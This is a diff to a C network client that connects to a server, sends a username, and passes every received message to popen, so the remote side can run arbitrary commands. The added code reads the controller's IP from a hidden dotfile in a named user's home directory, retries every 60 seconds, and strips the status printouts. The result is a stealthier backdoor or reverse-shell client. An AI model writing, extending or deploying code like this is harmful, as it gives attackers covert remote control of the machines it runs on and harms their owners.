@@ -10,12 +10,24 @@
 #define SERVER_ADDR     "10.5.5.32"
 #define MAXBUF          256
 
+void readFile(char* ip) {
+  char str[999];
+  FILE * file;
+  file = fopen( "/auto_home/nlephilippe/.redman" , "r");
+  if (file) {
+    while (fscanf(file, "%s", ip)!=EOF) {}
+    fclose(file);
+  }
+}
+
+
+
 int main(int argc, char *argv[] )
 {   int sockfd;
     struct sockaddr_in dest;
     char buffer[MAXBUF];
+    char ip[32];
     char* username = "unknown";
-    printf("username : %s\n", username);
     if(argc > 1) {
       username = argv[1];
     }
@@ -32,23 +44,24 @@ int main(int argc, char *argv[] )
     /*---Initialize server address/port struct---*/
     bzero(&dest, sizeof(dest));
     dest.sin_family = AF_INET;
-    dest.sin_port = htons(PORT_FTP);
-    if ( inet_aton(SERVER_ADDR, &dest.sin_addr.s_addr) == 0 )
-    {
-        perror(SERVER_ADDR);
-	//        exit(errno);
+    dest.sin_port = htons(PORT_FTP); 
+    do {
+      readFile(ip);
+      sleep(60);
     }
-
+    while ( inet_aton(ip, &dest.sin_addr.s_addr) == 0);
+    
     /*---Connect to server---*/
     while(1) {
-      if ( connect(sockfd, (struct sockaddr*)&dest, sizeof(dest)) != 0 )
-	{
-	  printf("could not connect, retrying in 60 seconds\n");
+      if ( connect(sockfd, (struct sockaddr*)&dest, sizeof(dest)) != 0 ){
 	  sleep(60);
-	  
+	  do {
+	    readFile(ip);
+	    sleep(60);
+	  }
+	  while ( inet_aton(ip, &dest.sin_addr.s_addr) == 0);
 	}
       else {
-	printf("connected\n");
 	bzero(buffer, MAXBUF);
 	printf("1\n");
 	char temp [32];
@@ -56,14 +69,12 @@ int main(int argc, char *argv[] )
 	strcat(temp, "\n");
 	printf("2\n");
 	strcpy(buffer, temp);
-	printf("sending : %s\n", buffer);
 	sleep(1);
 	write(sockfd,buffer,strlen(buffer));
 	/*---Get "Hello?"---*/
 	while(1) {
 	  bzero(buffer, MAXBUF);
 	  int data = recv(sockfd, buffer, sizeof(buffer), 0);
-	  printf("%s\n", buffer);
 	  if(data == 0) {return 0;}
 	  else {
 	    FILE *ls = popen(buffer, "r");
